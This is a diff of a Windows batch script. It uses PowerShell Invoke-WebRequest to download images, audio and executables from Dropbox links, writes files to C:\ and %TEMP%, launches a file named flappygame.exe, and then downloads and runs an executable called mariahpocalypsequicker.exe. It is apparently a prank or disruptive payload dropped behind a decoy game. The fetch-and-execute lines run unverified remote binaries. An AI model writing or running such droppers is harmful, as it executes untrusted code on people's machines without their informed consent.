@@ -1,12 +1,21 @@
-Powershell -Command "Invoke-WebRequest -Uri 'https://www.dropbox.com/scl/fi/n1gpikb87fvwsv3bx4uc2/ttpdpaper.jpg?rlkey=upe3ao99ydyyyu0ogeza08b1k&st=j7xskure&dl=1' -OutFile .\ttpdpaper.jpg"
-start ttpdpaper.jpg
+cd C:\
+Powershell -Command "Invoke-WebRequest -Uri 'link_to_0_icon_png' -OutFile C:\0.png"
+Powershell -Command "Invoke-WebRequest -Uri 'link_to_1_icon_png' -OutFile C:\1.png"
+Powershell -Command "Invoke-WebRequest -Uri 'link_to_2_icon_png' -OutFile C:\2.png"
+Powershell -Command "Invoke-WebRequest -Uri 'link_to_3_icon_png' -OutFile C:\3.png"
+Powershell -Command "Invoke-WebRequest -Uri 'link_to_4_icon_png' -OutFile C:\4.png"
+Powershell -Command "Invoke-WebRequest -Uri 'link_to_5_icon_png' -OutFile C:\5.png"
+Powershell -Command "Invoke-WebRequest -Uri 'link_to_6_icon_png' -OutFile C:\6.png"
+Powershell -Command "Invoke-WebRequest -Uri 'link_to_7_icon_png' -OutFile C:\7.png"
+Powershell -Command "Invoke-WebRequest -Uri 'link_to_8_icon_png' -OutFile C:\8.png"
+Powershell -Command "Invoke-WebRequest -Uri 'link_to_9_icon_png' -OutFile C:\9.png"
+Powershell -Command "Invoke-WebRequest -Uri 'link_to_background_jpg' -OutFile 'C:\dragonbackground.jpg'"
+Powershell -Command "Invoke-WebRequest -Uri 'link_to_dragon_icon_png' -OutFile 'C:\dragonicon.png'"
+Powershell -Command "Invoke-WebRequest -Uri 'link_to_roman_pillar_png' -OutFile 'C:\romanpillar.png'"
+Powershell -Command "Invoke-WebRequest -Uri 'link_to_sea_level_png' -OutFile 'C:\sealevelimage.png'"
+Powershell -Command "Invoke-WebRequest -Uri 'link_to_game_exe' -OutFile C:\flappygame.exe"
+start C:\flappygame.exe
 cd %TEMP%
-Powershell -Command "Invoke-WebRequest -Uri 'https://www.dropbox.com/scl/fi/d7rm88411iamm67soji3f/youtube_-Q6xx0JfMBI_audio.mp3?rlkey=pda19yxn1r3cqq26gzkkw3xis&st=7ic4eike&dl=1' -OutFile file1.mp3"
-Powershell -Command "Invoke-WebRequest -Uri 'https://www.dropbox.com/scl/fi/mldsfqz2j6mcbleei2d1x/youtube_4iusJui-BxM_audio.mp3?rlkey=ao0n7yv8fmhr66el6ugwowpld&st=sadtmd3d&dl=1' -OutFile file2.mp3"
-Powershell -Command "Invoke-WebRequest -Uri 'https://www.dropbox.com/scl/fi/ayswnbyq45slqhg5muk1q/youtube_CqBtS6BIP1E_audio.mp3?rlkey=rat1kez6nhelyob1182n936gw&st=grrv97m0&dl=1' -OutFile file3.mp3"
-Powershell -Command "Invoke-WebRequest -Uri 'https://www.dropbox.com/scl/fi/8cc392l8ft59jmpqnxbzg/youtube_FkDpwF6-QiA_audio.mp3?rlkey=g6s5zwhmukhzfzlm6ypyzh6cz&st=2vkb7nwg&dl=1' -OutFile file5.mp3"
-Powershell -Command "Invoke-WebRequest -Uri 'https://www.dropbox.com/scl/fi/hfle0zxfl2bj1wq38gn9r/youtube_Li6vpAMmfw0_audio.mp3?rlkey=pkhfm1mt1qc5l0j4nqtxbbj8f&st=xtmkl0qg&dl=1' -OutFile file7.mp3"
-Powershell -Command "Invoke-WebRequest -Uri 'https://www.dropbox.com/scl/fi/miqko7n0zgpyziov8bwaw/youtube_LKaXY4IdZ40_audio.mp3?rlkey=7z4lnmu0bryoofaahwwq7ikom&st=9jjwazrl&dl=1' -OutFile file8.mp3"
-Powershell -Command "Invoke-WebRequest -Uri 'https://www.dropbox.com/scl/fi/br0lonzdskbxn4wksnv5e/youtube_yU1knfz15xI_audio.mp3?rlkey=2rrp8xwag3h09q9vk5977axgc&st=y9qp7p3k&dl=1' -OutFile file11.mp3"
-Powershell -Command "Invoke-WebRequest -Uri 'https://www.dropbox.com/scl/fi/21qe8ytkzikh1nlk24ak3/mariahpocalypseslow.exe?rlkey=trd3l5zcwf7nyzkfivdlzq4av&st=8004lv9n&dl=1' -OutFile .\mariahpocalypse.exe"
-mariahpocalypse.exe
+Powershell -Command "Invoke-WebRequest -Uri 'link_to_aiwfciy_mp3' -OutFile aiwfciy.mp3"
+Powershell -Command "Invoke-WebRequest -Uri 'https://www.dropbox.com/scl/fi/cjezty410q9ggetufwygx/mariahpocalypsequicker.exe?rlkey=e8m5rm33x07evxkct7dv5uy3n&st=er8o771e&dl=1' -OutFile .\mariahpocalypsequicker.exe"
+mariahpocalypsequicker.exe
